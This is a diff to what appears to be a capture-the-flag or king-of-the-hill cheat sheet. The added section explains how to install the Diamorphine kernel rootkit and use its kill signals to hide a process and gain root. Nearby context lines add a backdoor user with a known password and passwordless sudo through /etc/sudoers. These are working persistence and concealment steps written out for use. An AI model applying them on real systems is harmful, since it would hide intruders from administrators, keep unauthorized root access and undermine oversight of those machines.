@@ -11,6 +11,13 @@ stty raw -echo;fg
 ```bash
 gcc -static -o proc proc.c
 ```
+# Defend `root.txt`
+Set up <a href="https://github.com/m0nad/Diamorphine">Diamorphine</a>, and hide the `kingmaker.c`.
+1. `make`
+2. `top -c -o PID -d 0` this command let's you find PID of `kingmaker`.
+3. `kill -63 0` makes `diamorphine` visibile/invisible.
+4. `kill -64 0` makes you `root`.
+5. `kill -31 PID_OF_KINGMAKER` hides `kingmaker.c`
 # Add New Super User
 ```bash
 useradd phpadmin && (echo -e "phpadmin\nphpadmin" | passwd phpadmin) && (echo "phpadmin ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
